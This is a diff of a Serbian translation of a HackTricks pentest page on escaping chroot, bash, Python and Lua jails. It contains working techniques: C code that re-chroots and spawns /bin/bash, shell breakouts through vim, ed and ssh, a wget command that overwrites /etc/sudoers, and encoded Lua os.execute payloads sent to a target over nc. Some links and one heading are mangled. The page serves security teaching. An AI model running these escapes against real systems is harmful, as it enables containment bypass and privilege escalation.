@@ -1,42 +1,42 @@
-# Bekstvo iz zatvora
+# Izlazak iz zatvora
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
 
 ## **GTFOBins**
 
-**Pretražite** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da biste videli da li možete izvršiti bilo koji binarni fajl sa "Shell" svojstvom**
+**Pretražite na** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da vidite da li možete izvršiti bilo koji binarni fajl sa "Shell" svojstvom**
 
-## Bekstva iz Chroot-a
+## Chroot Izlazi
 
-Sa [vikija](https://en.wikipedia.org/wiki/Chroot#Limitations): Mehanizam chroot-a **nije namenjen** zaštiti od namernog menjanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne stapaju pravilno i programi u chroot-u **sa dovoljnim privilegijama mogu izvršiti drugi chroot da bi izašli**.\
-Obično to znači da da biste pobegli morate biti root unutar chroot-a.
+Sa [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Chroot mehanizam **nije namenjen za odbranu** od namernog mešanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne slažu pravilno i chrootovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot da bi pobegli**.\
+Obično to znači da da biste pobegli, morate biti root unutar chroot-a.
 
 {% hint style="success" %}
-**Alat** [**chw00t**](https://github.com/earthquake/chw00t) je napravljen da zloupotrebi sledeće scenarije i pobegne iz `chroot`-a.
+**Alat** [**chw00t**](https://github.com/earthquake/chw00t) je kreiran da zloupotrebi sledeće scenarije i pobegne iz `chroot`.
 {% endhint %}
 
-### Root + Trenutni radni direktorijum
+### Root + CWD
 
 {% hint style="warning" %}
-Ako ste **root** unutar chroot-a, možete pobeci kreiranjem **još jednog chroot-a**. To je zato što 2 chroot-a ne mogu koegzistirati (u Linuxu), pa ako kreirate folder i zatim **napravite novi chroot** u tom novom folderu dok ste **vi van njega**, sada ćete biti **van novog chroot-a** i stoga ćete biti u FS-u.
+Ako ste **root** unutar chroot-a, **možete pobegnuti** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu koegzistirati (u Linux-u), tako da ako kreirate folder i zatim **napravite novi chroot** u tom novom folderu dok ste **van njega**, sada ćete biti **van novog chroot-a** i stoga ćete biti u FS-u.
 
-Ovo se dešava jer chroot OBICNO NE menja vaš trenutni radni direktorijum na naznačeni, tako da možete kreirati chroot ali biti van njega.
+To se dešava jer obično chroot NE pomera vaš radni direktorijum na označeni, tako da možete kreirati chroot, ali biti van njega.
 {% endhint %}
 
-Obično nećete naći binarni fajl `chroot` unutar chroot zatvora, ali **možete kompajlirati, otpremiti i izvršiti** binarni fajl:
+Obično nećete pronaći `chroot` binarni fajl unutar chroot zatvora, ali **možete kompajlirati, otpremiti i izvršiti** binarni fajl:
 
 <details>
 
@@ -89,10 +89,12 @@ chdir ".."
 chroot ".";
 system("/bin/bash");
 ```
-### Root + Sačuvani fd
+</details>
+
+### Root + Saved fd
 
 {% hint style="warning" %}
-Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva file deskriptor trenutnog direktorijuma** i zatim **kreira chroot u novom folderu**. Konačno, pošto ima **pristup** tom **FD** **izvan** chroot-a, pristupa mu i **izlazi**.
+Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva deskriptor datoteke za trenutni direktorijum** i zatim **stvara chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD** **van** chroot-a, pristupa mu i **beži**.
 {% endhint %}
 
 <details>
@@ -123,14 +125,14 @@ chroot(".");
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 {% hint style="warning" %}
-FD može biti prosleđen preko Unix Domain Sockets, tako da:
+FD može biti prosleđen preko Unix domen soketa, tako da:
 
-* Napravite dete proces (fork)
-* Napravite UDS tako da roditelj i dete mogu da komuniciraju
-* Pokrenite chroot u dečjem procesu u drugom folderu
-* U roditeljskom procesu, napravite FD foldera koji je van novog chroot-a dečjeg procesa
-* Prosledite tom FD-u detetu koristeći UDS
-* Dete proces promeni direktorijum na taj FD, i zbog toga što je van svog chroot-a, izbjeći će zatvor
+* Kreirajte podproces (fork)
+* Kreirajte UDS kako bi roditelj i dete mogli da komuniciraju
+* Pokrenite chroot u podprocesu u drugom folderu
+* U roditeljskom procesu, kreirajte FD foldera koji je van novog chroot-a podprocesa
+* Prosledite tom podprocesu taj FD koristeći UDS
+* Podproces menja direktorijum na taj FD, i pošto je van svog chroot-a, pobegnuće iz zatvora
 {% endhint %}
 
 ### Root + Mount
@@ -146,30 +148,30 @@ Ovo je moguće u Linux-u
 
 {% hint style="warning" %}
 * Montirajte procfs u direktorijum unutar chroot-a (ako već nije)
-* Potražite pid koji ima drugačiji root/cwd unos, kao što je: /proc/1/root
-* Chrootujte se u taj unos
+* Potražite pid koji ima drugačiji root/cwd unos, kao: /proc/1/root
+* Chroot u taj unos
 {% endhint %}
 
 ### Root(?) + Fork
 
 {% hint style="warning" %}
-* Napravite Fork (dete proces) i chrootujte se u drugi folder dublje u FS i promenite direktorijum na njega
-* Iz roditeljskog procesa, premestite folder gde je dečji proces u folder prethodno chroot-ovan od strane dece
-* Ovaj dečji proces će se naći van chroot-a
+* Kreirajte Fork (podproces) i chroot u drugi folder dublje u FS i CD na njega
+* Iz roditeljskog procesa, premestite folder u kojem se podproces nalazi u folder prethodni chroot-u dece
+* Ovaj podproces će se naći van chroot-a
 {% endhint %}
 
 ### ptrace
 
 {% hint style="warning" %}
-* Ranije korisnici su mogli da debaguju svoje procese iz procesa samog sebe... ali ovo više nije moguće podrazumevano
-* U svakom slučaju, ako je moguće, možete ptrace-ovati proces i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap\_sys\_ptrace)).
+* Pre nekog vremena korisnici su mogli da debaguju svoje procese iz procesa samog sebe... ali ovo više nije moguće po default-u
+* U svakom slučaju, ako je moguće, mogli biste ptrace u proces i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap\_sys\_ptrace)).
 {% endhint %}
 
-## Bash Zatvori
+## Bash Jails
 
-### Enumeracija
+### Enumeration
 
-Dobijanje informacija o zatvoru:
+Dobijte informacije o zatvoru:
 ```bash
 echo $SHELL
 echo $PATH
@@ -177,29 +179,29 @@ env
 export
 pwd
 ```
-### Izmena PATH
+### Измените PATH
 
-Proverite da li možete da izmenite PATH env promenljivu
+Проверите да ли можете да измените PATH env променљиву
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### Korišćenje vim-a
+### Koristeći vim
 ```bash
 :set shell=/bin/sh
 :shell
 ```
-### Napravite skriptu
+### Kreirajte skriptu
 
-Proverite da li možete napraviti izvršnu datoteku sa _/bin/bash_ kao sadržajem
+Proverite da li možete da kreirate izvršni fajl sa _/bin/bash_ kao sadržajem
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### Dobijanje bash-a putem SSH-a
+### Dobijanje bash-a preko SSH
 
-Ako pristupate putem SSH-a, možete koristiti ovaj trik da biste izvršili bash shell:
+Ako pristupate putem ssh, možete koristiti ovu trik da izvršite bash shell:
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
@@ -213,34 +215,34 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-Možete prepisati na primer sudoers fajl
+Možete prepisati, na primer, sudoers datoteku
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### Ostale trikove
+### Ostali trikovi
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io)\
-**Takođe može biti interesantna stranica:**
+[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
+**Takođe bi mogla biti zanimljiva stranica:**
 
 {% content-ref url="../bypass-bash-restrictions/" %}
 [bypass-bash-restrictions](../bypass-bash-restrictions/)
 {% endcontent-ref %}
 
-## Python Zatvori
+## Python zatvori
 
-Trikovi o bekstvu iz python zatvora na sledećoj stranici:
+Trikovi o izlasku iz python zatvora na sledećoj stranici:
 
 {% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
 [bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
 {% endcontent-ref %}
 
-## Lua Zatvori
+## Lua zatvori
 
-Na ovoj stranici možete pronaći globalne funkcije do kojih imate pristup unutar lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
+Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
-**Eval sa izvršenjem komande:**
+**Eval sa izvršavanjem komandi:**
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
@@ -249,11 +251,11 @@ Neki trikovi za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-Nabrajanje funkcija biblioteke:
+Nabrojite funkcije biblioteke:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-Napomena da svaki put kada izvršite prethodni jednolinijski niz u **različitom lua okruženju redosled funkcija se menja**. Stoga, ako treba da izvršite određenu funkciju, možete izvršiti napad grubom silom učitavanjem različitih lua okruženja i pozivanjem prve funkcije biblioteke.
+Napomena da se svaki put kada izvršite prethodni jedan red u **drugom lua okruženju redosled funkcija menja**. Stoga, ako treba da izvršite jednu specifičnu funkciju, možete izvršiti napad silom učitavajući različita lua okruženja i pozivajući prvu funkciju iz le biblioteke:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -264,7 +266,7 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**Dobijanje interaktivne lua ljuske**: Ako se nalazite unutar ograničene lua ljuske, možete dobiti novu lua ljusku (i nadamo se neograničenu) pozivom:
+**Dobijte interaktivnu lua ljusku**: Ako ste unutar ograničene lua ljuske, možete dobiti novu lua ljusku (i nadamo se neograničenu) pozivajući:
 ```bash
 debug.debug()
 ```
@@ -273,16 +275,16 @@ debug.debug()
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdovi: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
